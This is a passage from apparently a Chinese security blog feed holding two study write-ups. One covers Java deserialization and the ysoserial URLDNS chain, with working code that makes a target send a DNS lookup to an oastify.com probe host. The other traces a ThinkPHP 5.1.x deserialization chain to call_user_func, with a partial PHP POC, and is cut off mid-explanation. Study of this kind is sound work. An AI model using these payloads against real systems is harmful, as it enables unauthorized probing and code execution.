class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialized:&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Useri</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Useri</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transient</strong></p><p>transient 标识的对象成员变量不参与序列化</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>可以看见反序列化后, 会自动调用readObject()方法(在php中则是__wakeup这样的方法), 而如果程序对readObject()进行了重写, 并添加了一些危险操作, 就会在反序列化后自动进行这些个危险操作, </p><h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><blockquote><p>入口类一般是<code>Map,Hashmap,HashTable</code>这些集合类，因为集合类型宽泛（泛型），因此肯定继承了<code>Serializeable</code>接口，在<code>Hashmap</code>类中也重写了<code>readObject</code>方法</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309195913040.png" alt="image-20240309195913040"></p><p>为什么重写?</p><blockquote><p>HashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。<br>Hash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key&#x3D;’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>以ysoserial中的URLDNS作为一个例子</p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>上面已经看见了hashMap对readObject的重写, 重点关注以下内容, 在readObject的最后, 调用的putVal</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309201854085.png" alt="image-20240309201854085"></p><p>首先跟进hash函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309202142278.png" alt="image-20240309202142278"></p><p>这里调用了key.hashCode(), 而Object key是可控的, 因此就可以调用可控类下的hashCode()方法</p><p>现在转向URL类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309203605526.png" alt="image-20240309203605526"></p><p>我们发现URL类下也有一个hashCode方法, 因此如果我们将可控类传入为一个URL对象, 这里的hashCode就会被调用</p><p>但是这里存在一个hashCode值的判断, 当其不为-1时直接返回hashCode</p><p>好在其默认值为-1, 也就是说这里会转到hashCode &#x3D; handler.hashCode(this);</p><p>继续跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309204051582.png" alt="image-20240309204051582"></p><p>观察第367行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>这是一个获取主机地址的函数</p><p>因此, 如果我们传入一个vps的url地址, 这里就会触发一次对我们vps地址的解析, </p><p>倘若vps收到这个解析, 就能够证明反序列化漏洞的存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有趣的是这里序列化时也会发起一个dns请求</p><p>调试看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213620334.png" alt="image-20240309213620334"></p><p>跟进put方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213725383.png" alt="image-20240309213725383"></p><p>下一步直接调用了putVal 且key就是我们要解析的URL</p><p>所以, 在序列化时也会发起一次dns解析</p><p>再调试反序列化, 也会执行到这里</p><p>因此就无法判断哪一个请求是来自反序列化</p><p>此时就要引入上面提到的反射</p><p>通过反射, 在put时将hashCode的值设置为-1, 从而不执行后面的一系列方法, 在此之后, 又将hashCode设置为其他数字, 使其在反序列化时又能够触发dns请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, <span class="number">123</span>); <span class="comment">// 修改url中的hashcode为非-1</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//hashmap.put(new URL(&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;), 1);</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">       <span class="comment">// Object obj = unserialize();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;obj&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时,序列化时就不会产出dns请求, 而反序列化时会发起dns</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.1.x反序列化</title>
      <link href="/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x反序列化"><a href="#ThinkPHP-5-1-x反序列化" class="headerlink" title="ThinkPHP 5.1.x反序列化"></a>ThinkPHP 5.1.x反序列化</h1><p>我们已经学习了php反序列化的基础操作,但这远远不够</p><p> 前不久在比赛中遇到过几次thinkPHP反序列化的题目, 让人摸不着头脑, 最近又在大佬博客中无意间刷到了这部分内容, 在这里进行学习</p><p>参考: <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h2><ol><li>php7.2.34nts(phpstudy)</li><li>thinkPHP5.1.34</li></ol><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>首先就是tp5.1.34的安装, 几次从网上下载都不成功,最终方法是:</p><p>在phpstudy的composer2.5.8</p><p>在终端打开composer2.5.8的目录输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5_1_37</span><br></pre></td></tr></table></figure><p>下载后进入tp的目录</p><p>把”topthink&#x2F;framework”: “5.1.*”改成”topthink&#x2F;framework”: “5.1.37”</p><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><p><strong>首先跟一遍如何找链子</strong></p><p>由之前所学的知识可以找到, php反序列化最常见的入口就是<code>__destruct()</code>和<code>__wakeup()</code>其中最常见的就属<code>__destruct()</code></p><p>这里也正是利用<code>__destruct()</code>作为入口</p><p>首先seay全局查找<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304224653354.png" alt="image-20240304224653354"></p><p>我们要使用的就是<strong>think\process\pipes\Windows</strong> 类的 <strong>__destruct</strong> </p><p>其目录位置: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225102324.png" alt="image-20240304225102324"></p><p>跟进removeFiles()这个函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225229060.png" alt="image-20240304225229060"></p><p>这里调用了一个**file_exists($filename)**函数, 有趣的是这里的文件名 <strong>$filename</strong> 变量是可控。如果我们将一个类赋值给 <strong>$filename</strong> 变量，那么在 <strong>file_exists($filename)</strong> 的时候，就会触发这个类的 <strong>__toString</strong> 方法。</p><p>全局搜索**__toString()**方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225657758.png" alt="image-20240304225657758"></p><p>这里选用<strong>think&#x2F;concern&#x2F;Conversion</strong>类</p><p>目录路径: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304230129898.png" alt="image-20240304230129898"></p><p>跟进**toJson()**方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231418906.png" alt="image-20240304231418906"></p><p>继续跟进<strong>toArray()</strong></p><p>在<strong>toArray</strong>中**$relation<strong>可控, 并且赋值后调用</strong>$relation<strong>下的</strong>visible()**</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231547711.png" alt="image-20240304231547711"></p><p>跟进<strong>getAttr()方法</strong>看看$relation到底从何而来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231259379.png" alt="image-20240304231259379"></p><p>跟进<strong>getData()</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305001517580.png" alt="image-20240305001517580"></p><p>$this-&gt;data[$name]可控</p><p>这里附一张大佬的图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/4.png"></p><p>依照大佬的思路, 这里没有可利用的visible方法, 需要一个**_call()<strong>来被这个</strong>$relation-&gt;visible($name);**触发</p><p>依旧是全局搜索, 在<strong>think&#x2F;request</strong>类中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002602378.png" alt="image-20240305002602378"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002656453.png" alt="image-20240305002656453"></p><p>这里 <strong>call_user_func_array</strong> 函数的第一个参数完全可控, 因此我们可以调用<strong>call_user_func_array(array(任意类,任意方法),$args)</strong>, </p><p>虽然第330行用 <strong>array_unshift</strong> 函数把本类对象 <strong>$this</strong> 放在数组变量 <strong>$args</strong> 的第一个，但是我们可以寻找不受这个参数影响的方法。</p><blockquote><p>分析过 <strong>ThinkPHP</strong> 历史 <strong>RCE</strong> 漏洞的人可能知道， <strong>think\Request</strong> 类的 <strong>input</strong> 方法经常是链中一个非常棒的 <strong>Gadget</strong> ，相当于 <strong>call_user_func($filter,$data)</strong> 。但是前面我们说过， <strong>$args</strong> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 <strong>input</strong> 方法，而应该寻找调用 <strong>input</strong> 的方法。</p></blockquote><p>先来看看<strong>input()<strong>方法, 这里直接可以执行一个</strong>call_user_func($filter,$data)</strong></p><p>对应参数 $default 和 $filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131417663.png" alt="image-20240305131417663"></p><p>回调$this-&gt;filterValue()方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131601772.png" alt="image-20240305131601772"></p><p>我们需要控制的就是input的第一个参数$data和最后一个参数$filter</p><p>由于上面也提到了**__call()** 下的<strong>call_user_func_array(array(任意类,任意方法),$args)<strong>中</strong>$args</strong>是不可控的($args的第一个值被强制定义), 所以这里无法直接调用<strong>input()</strong>,因为我们不能控制其参数</p><p>所以应该转而查找哪里调用了<strong>input()</strong>,以此来间接调用避免掉**$args**的影响</p><p>这里不选用request</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305132947432.png" alt="image-20240305132947432"></p><p>找到当前类的param方法, 第961行调用了input, 且 第一个参数完全可控,  但$filter不可控, 因此, 又需要寻找哪里调用了param方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135640187.png" alt="image-20240305135640187"></p><p>可以看见, 当前类下的isAjax和isPjax两个方法都调用了param方法, 且参数完全可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135916160.png" alt="image-20240305135916160"></p><p>至此, 链子就有了</p><p>首先, 在windows.php下</p><p><strong>__destruct()</strong> –&gt; <strong>removeFiles()</strong>  –&gt;  <strong>__toString()</strong> –&gt;  </p><p>在Conversion.php下</p><p>–&gt; <strong>__toString()</strong>  –&gt; <strong>toJson()</strong>  –&gt;  <strong>toArray()</strong> –&gt; </p><p>在request.php下</p><p>–&gt; <strong>__call()</strong> –&gt;  <strong>isAjax()</strong>  –&gt; <strong>param()</strong>  –&gt; <strong>input()</strong>   –&gt; <strong>filterValue()</strong>  –&gt;  <strong>call_user_func()</strong></p><p>贴一张大佬的图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/10.png"></p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>上面已经找出来了一条链子, 但是具体细节并没有关注</p><p>前面的**__destruct**的触发不必多说, 但是 **__toString()**的触发就出现了第一个坑</p><p>我们在Conversion类的定义处可以发现, Conversion类是被trait修饰的, 因此, 它并不能被实例化, 但是trait修饰的类可以被其他类use,达到类似继承的效果</p><p>查找一下use了Conversion的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102313714.png" alt="image-20240306102313714"></p><p>这里有一个Model类, 跟进看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102413394.png" alt="image-20240306102413394"></p><p>Model虽然use了Conversion, 但它又被abstract修饰, 因此也不可以实例化, 但我们可以再查找继承Model的类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102637593.png" alt="image-20240306102637593"></p><p>不难发现有一个Pivot类是继承了Model类的,</p><p>因此, Pivot通过继承use了Conversion类的Model类,间接存在一个toString方法</p><p>因此, 触发链的开头就是</p><p>Windows-&gt;__destruct()   ——————-&gt;&gt;&gt;&gt;     Pivot-&gt;toString()</p><p><strong>poc</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面的继承关系并不用关心, 与源码中相同即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];<span class="comment">//触发Pivot(Conversion)-&gt;__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此, 代码执行后就会跳转到Pivot 下的toString, 由于这个方法是继承的Conversion的, 自然会跳转到Conversion类中</p><p>需要注意的是这里Windows-&gt;files是一个数组, 这是由源码中定义的</p><p>跳转到toString后, 依次要进入的是toJson,  toArray, 中间的过程并没有传递我们可控的参数, 所以并不关心</p><p>toArray的代码段比较长, 都是遍历了几个this下的可控变量, 我们只关心以下这个遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;    <span class="comment">//$this-&gt;append数组下的一个值需要为数组</span></span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$this-&gt;append as $key =&gt; $name</span></span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$item</span>;</span><br></pre></td></tr></table></figure><p>准确来说, 只关心这其中的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306105934360.png" alt="image-20240306105934360"></p><p>我们想要的是执行到$relation-&gt;visible($name);来调用一个_call, 所以需要几个条件</p><ol><li>进入 